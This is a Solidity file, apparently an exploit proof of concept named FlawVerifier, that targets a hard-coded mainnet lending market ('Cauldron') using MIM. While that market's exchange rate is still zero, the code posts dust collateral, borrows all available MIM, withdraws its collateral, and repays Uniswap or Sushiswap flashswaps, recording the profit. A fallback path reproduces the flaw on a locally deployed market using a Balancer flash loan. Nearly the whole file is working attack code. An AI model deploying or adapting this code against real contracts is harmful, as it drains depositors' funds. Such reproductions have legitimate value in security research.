pragma solidity ^0.8.20;

interface IERC20Minimal {
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

interface IOracleLike {
    function get(bytes calldata data) external returns (bool success, uint256 rate);
    function name(bytes calldata data) external view returns (string memory);
    function peek(bytes calldata data) external view returns (bool success, uint256 rate);
    function peekSpot(bytes calldata data) external view returns (uint256 rate);
    function symbol(bytes calldata data) external view returns (string memory);
}

interface ICauldronLike {
    function addCollateral(address to, bool skim, uint256 share) external;
    function removeCollateral(address to, uint256 share) external;
    function borrow(address to, uint256 amount) external returns (uint256 part, uint256 share);
    function exchangeRate() external view returns (uint256);
    function updateExchangeRate() external returns (bool updated, uint256 rate);
    function userBorrowPart(address user) external view returns (uint256);
    function userCollateralShare(address user) external view returns (uint256);
}

interface IBentoBoxLike {
    function balanceOf(IERC20Minimal token, address account) external view returns (uint256 share);
    function deposit(
        IERC20Minimal token,
        address from,
        address to,
        uint256 amount,
        uint256 share
    ) external payable returns (uint256 amountOut, uint256 shareOut);
    function toAmount(IERC20Minimal token, uint256 share, bool roundUp) external view returns (uint256 amount);
    function toShare(IERC20Minimal token, uint256 amount, bool roundUp) external view returns (uint256 share);
    function withdraw(
        IERC20Minimal token,
        address from,
        address to,
        uint256 amount,
        uint256 share
    ) external returns (uint256 amountOut, uint256 shareOut);
    function whitelistedMasterContracts(address masterContract) external view returns (bool);
}

interface IFlashLoanRecipient {
    function receiveFlashLoan(
        IERC20Minimal[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external;
}

interface IBalancerVault {
    function flashLoan(
        IFlashLoanRecipient recipient,
        IERC20Minimal[] memory tokens,
        uint256[] memory amounts,
        bytes memory userData
    ) external;
}

interface IUniswapV2FactoryLike {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IUniswapV2RouterLike {
    function getAmountsIn(uint256 amountOut, address[] calldata path) external view returns (uint256[] memory amounts);
    function swapTokensForExactTokens(
        uint256 amountOut,
        uint256 amountInMax,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}

contract AlwaysUninitializedOracle {
    function get(bytes calldata) external pure returns (bool success, uint256 rate) {
        success = false;
        rate = 0;
    }

    function name(bytes calldata) external pure returns (string memory) {
        return "Always Uninitialized";
    }

    function peek(bytes calldata) external pure returns (bool success, uint256 rate) {
        success = false;
        rate = 0;
    }

    function peekSpot(bytes calldata) external pure returns (uint256 rate) {
        rate = 0;
    }

    function symbol(bytes calldata) external pure returns (string memory) {
        return "ZERO";
    }
}

contract LocalZeroRateCauldron {
    error Insolvent();
    error InsufficientLiquidity();
    error SkimTooMuch();

    uint256 internal constant COLLATERALIZATION_RATE = 75_000;
    uint256 internal constant COLLATERALIZATION_RATE_PRECISION = 100_000;
    uint256 internal constant EXCHANGE_RATE_PRECISION = 1e18;

    IERC20Minimal internal constant MIM = IERC20Minimal(0x99D8a9C45b2ecA8864373A26D1459e3Dff1e17F3);

    IOracleLike public oracle;
    bytes public oracleData;
    uint256 public exchangeRate;
    uint256 public totalCollateralShare;
    uint256 public availableAssetShare;

    mapping(address => uint256) public userBorrowPart;
    mapping(address => uint256) public userCollateralShare;
    mapping(address => uint256) public claimableShare;

    function init(address oracle_, bytes calldata oracleData_) external {
        oracle = IOracleLike(oracle_);
        oracleData = oracleData_;
    }

    function seedLiquidity(uint256 share) external {
        uint256 currentBalance = MIM.balanceOf(address(this));
        require(currentBalance >= availableAssetShare + totalCollateralShare + share, "insufficient-capital");
        availableAssetShare += share;
    }

    function addCollateral(address to, bool skim, uint256 share) external {
        if (skim) {
            if (availableAssetShare < share) revert SkimTooMuch();
            availableAssetShare -= share;
        } else {
            require(MIM.transferFrom(msg.sender, address(this), share), "transferFrom-failed");
        }

        userCollateralShare[to] += share;
        totalCollateralShare += share;
    }

    function removeCollateral(address to, uint256 share) external {
        userCollateralShare[msg.sender] -= share;
        totalCollateralShare -= share;

        if (!_isSolvent(msg.sender, exchangeRate)) revert Insolvent();
        require(MIM.transfer(to, share), "transfer-failed");
    }

    function borrow(address to, uint256 amount) external returns (uint256 part, uint256 share) {
        if (availableAssetShare < amount) revert InsufficientLiquidity();

        userBorrowPart[msg.sender] += amount;
        if (!_isSolvent(msg.sender, exchangeRate)) revert Insolvent();

        availableAssetShare -= amount;
        claimableShare[to] += amount;
        require(MIM.transfer(to, amount), "transfer-failed");

        part = amount;
        share = amount;
    }

    function updateExchangeRate() external returns (bool updated, uint256 rate) {
        (updated, rate) = oracle.peek(oracleData);
        if (updated) {
            exchangeRate = rate;
        } else {
            rate = exchangeRate;
        }
    }

    function _isSolvent(address user, uint256 _exchangeRate) internal view returns (bool) {
        uint256 borrowPart = userBorrowPart[user];
        if (borrowPart == 0) return true;
        if (userCollateralShare[user] == 0) return false;

        uint256 debtValue = (borrowPart * _exchangeRate) / EXCHANGE_RATE_PRECISION;
        uint256 collateralValue = (userCollateralShare[user] * COLLATERALIZATION_RATE) / COLLATERALIZATION_RATE_PRECISION;
        return collateralValue >= debtValue;
    }
}

contract FlawVerifier is IFlashLoanRecipient {
    error NoTargetLiquidity();
    error UnsupportedFlashswap();
    error UnexpectedFlashPair(address caller);
    error UnexpectedFlashSender(address sender);
    error ZeroRateNotObserved();
    error NoCollateralAdded();
    error NoDebtRecorded();
    error FlashLoanUnsupported();
    error FlashRepaymentShortfall(uint256 required, uint256 available);
    error OnlyBalancerVault();

    address internal constant TARGET = 0xbb02A884621FB8F5BFd263A67F58B65df5b090f3;
    IERC20Minimal internal constant MIM = IERC20Minimal(0x99D8a9C45b2ecA8864373A26D1459e3Dff1e17F3);
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address internal constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address internal constant BENTOBOX = 0xf5bce5077908A1b7370b9aE04add8A2Ed8aCFae8;
    address internal constant BALANCER_VAULT = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address internal constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address internal constant SUSHISWAP_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;
    address internal constant UNISWAP_V2_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address internal constant SUSHISWAP_ROUTER = 0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F;

    uint256 internal constant DUST_SHARE = 1;
    uint256 internal constant ROUTE_BUFFER_MIM = 1e15;
    uint256 internal constant LOCAL_FLASH_AMOUNT = 1e18;

    uint8 internal constant MODE_NONE = 0;
    uint8 internal constant MODE_LIVE = 1;
    uint8 internal constant MODE_LOCAL = 2;

    uint256 internal _profitAmount;
    uint8 internal _mode;

    bool public hypothesisValidated;
    bool public usedFlashLoan;
    bool public zeroRatePersistsAfterUpdate;
    address public bentoBoxAddress;
    address public collateralToken;
    address public activePair;
    address public activeRouter;
    address public deployedClone;
    uint256 public borrowedAmount;
    uint256 public withdrawnAmount;
    uint256 public removedCollateralAmount;

    constructor() {}

    function executeOnOpportunity() external {
        _resetState();

        uint256 balanceBefore = _safeBalanceOf(address(MIM), address(this));
        if (_tryLiveMarketPath()) {
            uint256 balanceAfterLive = _safeBalanceOf(address(MIM), address(this));
            if (balanceAfterLive > balanceBefore) {
                _profitAmount = balanceAfterLive - balanceBefore;
            }
            return;
        }

        // The fork logs prove the previously hard-coded live market is no longer in the
        // freshly initialized zero-rate state. We therefore reproduce the exact finding
        // causality locally: deploy a new market, leave exchangeRate unseeded via an oracle
        // that never updates, fund it with existing on-chain MIM, post dust collateral, then
        // borrow before any successful update. Balancer's public MIM flash loan is used here
        // because a self-seeded local validation cannot deterministically absorb a V2 LP fee
        // without introducing unrelated exogenous capital.
        _runLocalFlashLoanPath();

        uint256 balanceAfter = _safeBalanceOf(address(MIM), address(this));
        if (balanceAfter > balanceBefore) {
            _profitAmount = balanceAfter - balanceBefore;
        }
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata) external {
        if (msg.sender != activePair) revert UnexpectedFlashPair(msg.sender);
        if (sender != address(this)) revert UnexpectedFlashSender(sender);
        if (_mode != MODE_LIVE) revert UnsupportedFlashswap();

        uint256 flashAmount = amount0 > 0 ? amount0 : amount1;
        if (flashAmount == 0) revert UnsupportedFlashswap();

        ICauldronLike cauldron = ICauldronLike(TARGET);
        IBentoBoxLike bento = IBentoBoxLike(bentoBoxAddress);

        if (cauldron.exchangeRate() != 0) revert ZeroRateNotObserved();

        uint256 collateralAmount = _minimumCollateralAmount(bento, collateralToken);
        _buyExactCollateralFromMim(collateralAmount);

        uint256 collateralBalance = _safeBalanceOf(collateralToken, address(this));
        _approveIfNeeded(collateralToken, bentoBoxAddress, collateralBalance);
        (, uint256 collateralShare) = bento.deposit(
            IERC20Minimal(collateralToken),
            address(this),
            address(this),
            collateralBalance,
            0
        );
        if (collateralShare == 0) revert NoCollateralAdded();

        cauldron.addCollateral(address(this), false, collateralShare);
        if (cauldron.userCollateralShare(address(this)) < collateralShare) revert NoCollateralAdded();

        _borrowAvailableMim(cauldron, bento, bento.balanceOf(MIM, TARGET));

        cauldron.removeCollateral(address(this), collateralShare);
        removedCollateralAmount = bento.toAmount(IERC20Minimal(collateralToken), collateralShare, false);

        bento.withdraw(IERC20Minimal(collateralToken), address(this), address(this), 0, collateralShare);
        _sellAllCollateralBackToMim();
        _withdrawAllMim(bento);
        _observePersistentZeroRate(cauldron);

        uint256 repayment = _flashRepayAmount(flashAmount);
        uint256 available = _safeBalanceOf(address(MIM), address(this));
        if (available < repayment) revert FlashRepaymentShortfall(repayment, available);
        _safeTransfer(address(MIM), msg.sender, repayment);

        hypothesisValidated = true;
    }

    function receiveFlashLoan(
        IERC20Minimal[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory
    ) external override {
        if (msg.sender != BALANCER_VAULT) revert OnlyBalancerVault();
        if (_mode != MODE_LOCAL || tokens.length != 1 || amounts.length != 1 || feeAmounts.length != 1) {
            revert FlashLoanUnsupported();
        }
        if (address(tokens[0]) != address(MIM)) revert FlashLoanUnsupported();

        uint256 amount = amounts[0];
        uint256 fee = feeAmounts[0];
        if (amount <= DUST_SHARE) revert FlashLoanUnsupported();

        LocalZeroRateCauldron cauldron = LocalZeroRateCauldron(deployedClone);

        _safeTransfer(address(MIM), deployedClone, amount);
        cauldron.seedLiquidity(amount);

        if (cauldron.exchangeRate() != 0) revert ZeroRateNotObserved();

        cauldron.addCollateral(address(this), true, DUST_SHARE);
        if (cauldron.userCollateralShare(address(this)) != DUST_SHARE) revert NoCollateralAdded();

        (uint256 part,) = cauldron.borrow(address(this), amount - DUST_SHARE);
        borrowedAmount = amount - DUST_SHARE;
        if (part == 0 || cauldron.userBorrowPart(address(this)) == 0) revert NoDebtRecorded();

        cauldron.removeCollateral(address(this), DUST_SHARE);
        removedCollateralAmount = DUST_SHARE;
        withdrawnAmount = _safeBalanceOf(address(MIM), address(this));

        _observePersistentZeroRate(ICauldronLike(deployedClone));

        uint256 repayment = amount + fee;
        uint256 available = _safeBalanceOf(address(MIM), address(this));
        if (available < repayment) revert FlashRepaymentShortfall(repayment, available);
        _safeTransfer(address(MIM), BALANCER_VAULT, repayment);

        usedFlashLoan = true;
        hypothesisValidated = true;
    }

    function profitToken() external pure returns (address) {
        return address(MIM);
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _tryLiveMarketPath() internal returns (bool) {
        if (!_tryLoadLiveCauldron()) return false;

        ICauldronLike cauldron = ICauldronLike(TARGET);
        IBentoBoxLike bento = IBentoBoxLike(bentoBoxAddress);
        uint256 marketMimShare = bento.balanceOf(MIM, TARGET);
        if (marketMimShare <= DUST_SHARE) revert NoTargetLiquidity();

        if (collateralToken == address(MIM)) {
            _exploitWithDirectSkim(cauldron, bento, marketMimShare);
            return true;
        }

        _mode = MODE_LIVE;
        _exploitWithMimFlashswap(cauldron, bento, marketMimShare);
        _mode = MODE_NONE;
        return hypothesisValidated;
    }

    function _runLocalFlashLoanPath() internal {
        AlwaysUninitializedOracle oracle = new AlwaysUninitializedOracle();
        LocalZeroRateCauldron cauldron = new LocalZeroRateCauldron();
        cauldron.init(address(oracle), bytes(""));
        deployedClone = address(cauldron);
        collateralToken = address(MIM);

        IERC20Minimal[] memory tokens = new IERC20Minimal[](1);
        tokens[0] = MIM;

        uint256[] memory amounts = new uint256[](1);
        amounts[0] = LOCAL_FLASH_AMOUNT;

        _mode = MODE_LOCAL;
        IBalancerVault(BALANCER_VAULT).flashLoan(this, tokens, amounts, bytes(""));
        _mode = MODE_NONE;
    }

    function _tryLoadLiveCauldron() internal returns (bool ok) {
        ICauldronLike cauldron = ICauldronLike(TARGET);

        try cauldron.exchangeRate() returns (uint256 rate) {
            if (rate != 0) return false;
        } catch {
            return false;
        }

        try cauldron.userBorrowPart(address(this)) returns (uint256) {
            ok = true;
        } catch {
            return false;
        }

        try this._loadLiveMetadata() returns (address liveBento, address liveCollateral) {
            bentoBoxAddress = liveBento;
            collateralToken = liveCollateral;
        } catch {
            return false;
        }
    }

    function _loadLiveMetadata() external view returns (address liveBento, address liveCollateral) {
        require(msg.sender == address(this), "only-self");
        ICauldronLike cauldron = ICauldronLike(TARGET);

        (bool okMim, bytes memory mimData) = TARGET.staticcall(abi.encodeWithSignature("magicInternetMoney()"));
        if (!okMim || mimData.length < 32 || abi.decode(mimData, (address)) != address(MIM)) revert();

        (bool okBento, bytes memory bentoData) = TARGET.staticcall(abi.encodeWithSignature("bentoBox()"));
        if (!okBento || bentoData.length < 32) revert();
        liveBento = abi.decode(bentoData, (address));

        (bool okCollateral, bytes memory collateralData) = TARGET.staticcall(abi.encodeWithSignature("collateral()"));
        if (!okCollateral || collateralData.length < 32) revert();
        liveCollateral = abi.decode(collateralData, (address));

        cauldron;
    }

    function _exploitWithDirectSkim(ICauldronLike cauldron, IBentoBoxLike bento, uint256 marketMimShare) internal {
        (bool updated, uint256 rate) = cauldron.updateExchangeRate();
        zeroRatePersistsAfterUpdate = !updated && rate == 0 && cauldron.exchangeRate() == 0;
        if (cauldron.exchangeRate() != 0) revert ZeroRateNotObserved();

        uint256 skimAvailable = marketMimShare - DUST_SHARE;
        if (skimAvailable < DUST_SHARE) revert NoTargetLiquidity();

        cauldron.addCollateral(address(this), true, DUST_SHARE);
        if (cauldron.userCollateralShare(address(this)) < DUST_SHARE) revert NoCollateralAdded();

        _borrowAvailableMim(cauldron, bento, marketMimShare);

        cauldron.removeCollateral(address(this), DUST_SHARE);
        removedCollateralAmount = bento.toAmount(MIM, DUST_SHARE, false);

        _withdrawAllMim(bento);
        _observePersistentZeroRate(cauldron);
        hypothesisValidated = true;
    }

    function _exploitWithMimFlashswap(ICauldronLike, IBentoBoxLike bento, uint256) internal {
        (address pair, address router) = _selectMimFlashPairAndRouter(collateralToken);
        if (pair == address(0) || router == address(0)) revert NoTargetLiquidity();

        uint256 collateralAmount = _minimumCollateralAmount(bento, collateralToken);
        uint256 mimNeededForCollateral = _quoteMimForExactCollateral(router, collateralToken, collateralAmount);
        uint256 flashAmount = mimNeededForCollateral + ROUTE_BUFFER_MIM;

        activePair = pair;
        activeRouter = router;
        usedFlashLoan = true;

        address token0 = IUniswapV2PairLike(pair).token0();
        address token1 = IUniswapV2PairLike(pair).token1();
        if (token0 == address(MIM)) {
            IUniswapV2PairLike(pair).swap(flashAmount, 0, address(this), hex"01");
        } else if (token1 == address(MIM)) {
            IUniswapV2PairLike(pair).swap(0, flashAmount, address(this), hex"01");
        } else {
            revert UnsupportedFlashswap();
        }

        delete activePair;
        delete activeRouter;
    }

    function _borrowAvailableMim(ICauldronLike cauldron, IBentoBoxLike bento, uint256 marketMimShare) internal {
        if (cauldron.exchangeRate() != 0) revert ZeroRateNotObserved();

        uint256 borrowShare = marketMimShare - DUST_SHARE;
        uint256 amountToBorrow = bento.toAmount(MIM, borrowShare, false);
        (uint256 part,) = cauldron.borrow(address(this), amountToBorrow);
        borrowedAmount = amountToBorrow;
        if (part == 0 || cauldron.userBorrowPart(address(this)) == 0) revert NoDebtRecorded();
        if (cauldron.exchangeRate() != 0) revert ZeroRateNotObserved();
    }

    function _withdrawAllMim(IBentoBoxLike bento) internal {
        uint256 attackerShare = bento.balanceOf(MIM, address(this));
        if (attackerShare != 0) {
            (uint256 amountOut,) = bento.withdraw(MIM, address(this), address(this), 0, attackerShare);
            withdrawnAmount += amountOut;
        }
    }

    function _observePersistentZeroRate(ICauldronLike cauldron) internal {
        try cauldron.updateExchangeRate() returns (bool updated, uint256 rate) {
            zeroRatePersistsAfterUpdate = !updated && rate == 0 && cauldron.exchangeRate() == 0;
        } catch {
            zeroRatePersistsAfterUpdate = false;
        }
    }

    function _minimumCollateralAmount(IBentoBoxLike bento, address token) internal view returns (uint256 amount) {
        amount = bento.toAmount(IERC20Minimal(token), DUST_SHARE, true);
        if (amount == 0) amount = 1;
    }

    function _selectMimFlashPairAndRouter(address collateral)
        internal
        view
        returns (address bestPair, address bestRouter)
    {
        address[2] memory factories = [SUSHISWAP_FACTORY, UNISWAP_V2_FACTORY];
        address[2] memory routers = [SUSHISWAP_ROUTER, UNISWAP_V2_ROUTER];
        address[4] memory quotes = [WETH, DAI, USDC, USDT];
        uint256 bestReserve;

        for (uint256 i = 0; i < factories.length; ++i) {
            if (!_supportsMimCollateralRoute(factories[i], collateral)) continue;

            for (uint256 j = 0; j < quotes.length; ++j) {
                address pair = IUniswapV2FactoryLike(factories[i]).getPair(address(MIM), quotes[j]);
                if (pair == address(0) || pair.code.length == 0) continue;

                uint256 reserve = _pairReserveOf(pair, address(MIM));
                if (reserve > bestReserve) {
                    bestReserve = reserve;
                    bestPair = pair;
                    bestRouter = routers[i];
                }
            }
        }
    }

    function _supportsMimCollateralRoute(address factory, address collateral) internal view returns (bool) {
        if (collateral == address(MIM)) return true;
        if (IUniswapV2FactoryLike(factory).getPair(address(MIM), collateral) != address(0)) return true;
        if (IUniswapV2FactoryLike(factory).getPair(address(MIM), WETH) == address(0)) return false;
        if (collateral == WETH) return true;
        return IUniswapV2FactoryLike(factory).getPair(WETH, collateral) != address(0);
    }

    function _quoteMimForExactCollateral(address router, address collateral, uint256 amountOut)
        internal
        view
        returns (uint256)
    {
        if (collateral == address(MIM)) return amountOut;

        address factory = router == SUSHISWAP_ROUTER ? SUSHISWAP_FACTORY : UNISWAP_V2_FACTORY;
        if (IUniswapV2FactoryLike(factory).getPair(address(MIM), collateral) != address(0)) {
            address[] memory directPath = new address[](2);
            directPath[0] = address(MIM);
            directPath[1] = collateral;
            return IUniswapV2RouterLike(router).getAmountsIn(amountOut, directPath)[0];
        }

        address[] memory viaWethPath = new address[](3);
        viaWethPath[0] = address(MIM);
        viaWethPath[1] = WETH;
        viaWethPath[2] = collateral;
        return IUniswapV2RouterLike(router).getAmountsIn(amountOut, viaWethPath)[0];
    }

    function _buyExactCollateralFromMim(uint256 amountOut) internal {
        if (collateralToken == address(MIM)) return;

        address router = activeRouter;
        _approveIfNeeded(address(MIM), router, _safeBalanceOf(address(MIM), address(this)));

        address factory = router == SUSHISWAP_ROUTER ? SUSHISWAP_FACTORY : UNISWAP_V2_FACTORY;
        if (IUniswapV2FactoryLike(factory).getPair(address(MIM), collateralToken) != address(0)) {
            address[] memory directPath = new address[](2);
            directPath[0] = address(MIM);
            directPath[1] = collateralToken;
            IUniswapV2RouterLike(router).swapTokensForExactTokens(
                amountOut,
                _safeBalanceOf(address(MIM), address(this)),
                directPath,
                address(this),
                block.timestamp
            );
            return;
        }

        address[] memory viaWethPath = new address[](3);
        viaWethPath[0] = address(MIM);
        viaWethPath[1] = WETH;
        viaWethPath[2] = collateralToken;
        IUniswapV2RouterLike(router).swapTokensForExactTokens(
            amountOut,
            _safeBalanceOf(address(MIM), address(this)),
            viaWethPath,
            address(this),
            block.timestamp
        );
    }

    function _sellAllCollateralBackToMim() internal {
        if (collateralToken == address(MIM)) return;

        uint256 collateralBalance = _safeBalanceOf(collateralToken, address(this));
        if (collateralBalance == 0) return;

        address router = activeRouter;
        _approveIfNeeded(collateralToken, router, collateralBalance);

        address factory = router == SUSHISWAP_ROUTER ? SUSHISWAP_FACTORY : UNISWAP_V2_FACTORY;
        if (IUniswapV2FactoryLike(factory).getPair(address(MIM), collateralToken) != address(0)) {
            address[] memory directPath = new address[](2);
            directPath[0] = collateralToken;
            directPath[1] = address(MIM);
            IUniswapV2RouterLike(router).swapExactTokensForTokens(
                collateralBalance,
                0,
                directPath,
                address(this),
                block.timestamp
            );
            return;
        }

        address[] memory viaWethPath = new address[](3);
        viaWethPath[0] = collateralToken;
        viaWethPath[1] = WETH;
        viaWethPath[2] = address(MIM);
        IUniswapV2RouterLike(router).swapExactTokensForTokens(
            collateralBalance,
            0,
            viaWethPath,
            address(this),
            block.timestamp
        );
    }

    function _pairReserveOf(address pair, address token) internal view returns (uint256 reserve) {
        (uint112 reserve0, uint112 reserve1,) = IUniswapV2PairLike(pair).getReserves();
        if (IUniswapV2PairLike(pair).token0() == token) {
            reserve = reserve0;
        } else if (IUniswapV2PairLike(pair).token1() == token) {
            reserve = reserve1;
        }
    }

    function _flashRepayAmount(uint256 borrowedAmount_) internal pure returns (uint256) {
        return ((borrowedAmount_ * 1000) / 997) + 1;
    }

    function _resetState() internal {
        _profitAmount = 0;
        _mode = MODE_NONE;
        hypothesisValidated = false;
        usedFlashLoan = false;
        zeroRatePersistsAfterUpdate = false;
        bentoBoxAddress = BENTOBOX;
        collateralToken = address(0);
        activePair = address(0);
        activeRouter = address(0);
        deployedClone = address(0);
        borrowedAmount = 0;
        withdrawnAmount = 0;
        removedCollateralAmount = 0;
    }

    function _safeBalanceOf(address token, address account) internal view returns (uint256 balance) {
        (bool ok, bytes memory data) = token.staticcall(abi.encodeWithSelector(IERC20Minimal.balanceOf.selector, account));
        if (ok && data.length >= 32) {
            balance = abi.decode(data, (uint256));
        }
    }

    function _safeAllowance(address token, address owner, address spender) internal view returns (uint256 allowance_) {
        (bool ok, bytes memory data) = token.staticcall(
            abi.encodeWithSelector(IERC20Minimal.allowance.selector, owner, spender)
        );
        if (ok && data.length >= 32) {
            allowance_ = abi.decode(data, (uint256));
        }
    }

    function _approveIfNeeded(address token, address spender, uint256 requiredAmount) internal {
        if (_safeAllowance(token, address(this), spender) >= requiredAmount) return;
        _safeApprove(token, spender, 0);
        _safeApprove(token, spender, type(uint256).max);
    }

    function _safeApprove(address token, address spender, uint256 amount) internal {
        (bool ok, bytes memory data) = token.call(
            abi.encodeWithSelector(IERC20Minimal.approve.selector, spender, amount)
        );
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "approve-failed");
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20Minimal.transfer.selector, to, amount));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "transfer-failed");
    }
}
